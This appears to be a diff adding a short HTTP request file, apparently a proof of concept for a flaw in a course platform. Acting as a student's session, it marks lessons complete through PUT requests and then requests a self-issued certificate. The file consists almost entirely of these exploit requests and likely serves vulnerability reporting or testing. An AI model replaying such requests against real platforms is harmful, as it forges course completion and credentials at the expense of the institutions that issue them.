@@ -1,0 +1,15 @@
+### mark each lesson complete purely from the client (no work done)
+PUT http://localhost:21527/course/6da34ade-de37-4a92-a151-b1d6a0756e95/lesson/2c844eb4-3818-43dd-a47a-42289f84a68e/completion HTTP/1.1
+Content-Type: application/json
+Cookie: classroomio.session_token=<attacker student>
+
+{"isComplete":true}
+
+PUT http://localhost:21527/course/6da34ade-de37-4a92-a151-b1d6a0756e95/lesson/471b2998-27b8-4b60-bea3-03d89c24b54b/completion HTTP/1.1
+Content-Type: application/json
+Cookie: classroomio.session_token=<attacker student>
+
+{"isComplete":true}
+
+### progress -> 100% and certificate is self-issued:
+GET http://localhost:21527/course/6da34ade-de37-4a92-a151-b1d6a0756e95/certification-evaluation HTTP/1.1
